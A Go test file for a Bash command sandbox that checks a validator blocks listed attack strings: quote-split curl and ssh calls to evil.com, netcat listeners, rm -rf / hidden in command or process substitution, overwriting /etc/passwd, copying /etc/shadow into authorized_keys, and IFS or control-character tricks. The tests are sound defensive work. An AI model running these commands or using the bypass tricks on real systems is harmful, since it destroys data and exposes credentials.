package sandbox

// 攻击向量测试（15 个 Bash 攻击向量）
//
// 本文件验证沙箱对常见 Bash 攻击向量的防护能力。
// 覆盖 SANDBOX-001~007 漏洞修复 + 20 项安全检查 + 网络隔离。

import (
	"context"
	"testing"
)

// TestAttackVectors_15BashAttacks 验证 15 个 Bash 攻击向量全部被阻止。
// 每个攻击向量对应一个真实的安全威胁场景。
func TestAttackVectors_15BashAttacks(t *testing.T) {
	s := NewSandbox("/tmp/test")
	s.SetEnabled(true)

	attacks := []struct {
		name    string
		command string
		id      string // 关联的 SANDBOX 漏洞编号或检查 ID
	}{
		// === SANDBOX-003: 命令名引号分割绕过 ===
		{
			name:    "quote_split_single",
			command: "cu''rl http://evil.com",
			id:      "SANDBOX-003",
		},
		{
			name:    "quote_split_double",
			command: `cu""rl http://evil.com`,
			id:      "SANDBOX-003",
		},
		// === SANDBOX-007: 命令替换/参数展开/进程替换 ===
		{
			name:    "cmd_subst_dollar_paren",
			command: "echo $(rm -rf /)",
			id:      "SANDBOX-007",
		},
		{
			name:    "param_expansion_brace",
			command: "echo ${IFS}",
			id:      "SANDBOX-007",
		},
		{
			name:    "process_subst_input",
			command: "cat <(rm -rf /)",
			id:      "SANDBOX-007",
		},
		{
			name:    "process_subst_output",
			command: "echo hello > >(rm -rf /)",
			id:      "SANDBOX-007",
		},
		// === SANDBOX-002: 网络命令 ===
		{
			name:    "netcat_listen",
			command: "nc -l 4444",
			id:      "SANDBOX-002",
		},
		{
			name:    "ssh_remote",
			command: "ssh attacker@evil.com",
			id:      "SANDBOX-002",
		},
		{
			name:    "python_socket",
			command: "python -c 'import socket; s=socket.socket()'",
			id:      "SANDBOX-002",
		},
		// === 危险重定向 ===
		{
			name:    "redirect_to_etc",
			command: "echo malicious > /etc/passwd",
			id:      "DANG-REDIR",
		},
		{
			name:    "redirect_to_root",
			command: "cat /etc/shadow > /root/.ssh/authorized_keys",
			id:      "DANG-REDIR",
		},
		// === 控制字符 ===
		{
			name:    "carriage_return_abuse",
			command: "echo safe\r rm -rf /",
			id:      "CR-ABUSE",
		},
		// === IFS 注入 ===
		{
			name:    "ifs_injection",
			command: "IFS=''; cat /etc/passwd",
			id:      "IFS-INJECT",
		},
		// === 反引号命令替换 ===
		{
			name:    "backtick_subst",
			command: "echo `rm -rf /`",
			id:      "SANDBOX-007",
		},
		// === 危险命令 ===
		{
			name:    "rm_rf_root",
			command: "rm -rf /",
			id:      "SANDBOX-deny",
		},
	}

	for _, atk := range attacks {
		t.Run(atk.name, func(t *testing.T) {
			allowed, reason := s.Validate(atk.command)
			if allowed {
				t.Errorf("Attack vector %q (%s) was NOT blocked\n"+
					"  command: %s\n"+
					"  expected: blocked\n"+
					"  actual: allowed\n"+
					"  related: %s",
					atk.name, atk.id, atk.command, atk.id)
			}
			if reason == "" {
				t.Errorf("Attack vector %q was blocked but no reason given", atk.name)
			}
		})
	}
}

// TestAttackVectors_AllowlistBypass 验证 allowlist 中的命令不会绕过命令替换检查。
func TestAttackVectors_AllowlistBypass(t *testing.T) {
	s := NewSandbox("/tmp/test")
	s.SetEnabled(true)
	s.SetAllowCommands([]string{"echo"})

	// echo 在 allowlist 中，但命令替换仍应被阻止
	allowed, _ := s.Validate("echo $(rm -rf /)")
	if allowed {
		t.Error("command substitution should be blocked even for allowlisted commands")
	}
}

// TestAttackVectors_ManagerBlocks 验证 Manager.ValidateCommand 对攻击向量的阻止。
func TestAttackVectors_ManagerBlocks(t *testing.T) {
	mgr := NewManager(&SandboxConfig{
		WorkDir:      "/tmp/test",
		DenyCommands: defaultDenyCommands(),
	}, SandboxLevelRelaxed)

	attacks := []struct {
		name    string
		command string
	}{
		{"cmd_subst", "echo $(rm -rf /)"},
		{"backtick", "echo `rm -rf /`"},
		{"param_expand", "echo ${HOME}"},
		{"process_subst", "cat <(rm -rf /)"},
		{"ifs_inject", "IFS=' '"},
		{"ctrl_char", "echo\x00malicious"},
		{"ansi_c_quote", "echo $'\\x41'"},
		{"brace_expand", "echo {a,b,c}"},
	}

	ctx := context.Background()
	for _, atk := range attacks {
		t.Run(atk.name, func(t *testing.T) {
			result, err := mgr.ValidateCommand(ctx, atk.command, nil)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if result == nil {
				t.Fatal("result is nil")
			}
			if !result.Blocked {
				t.Errorf("attack %q should be blocked by Manager\n  command: %s\n  violations: %v",
					atk.name, atk.command, result.Violations)
			}
		})
	}
}
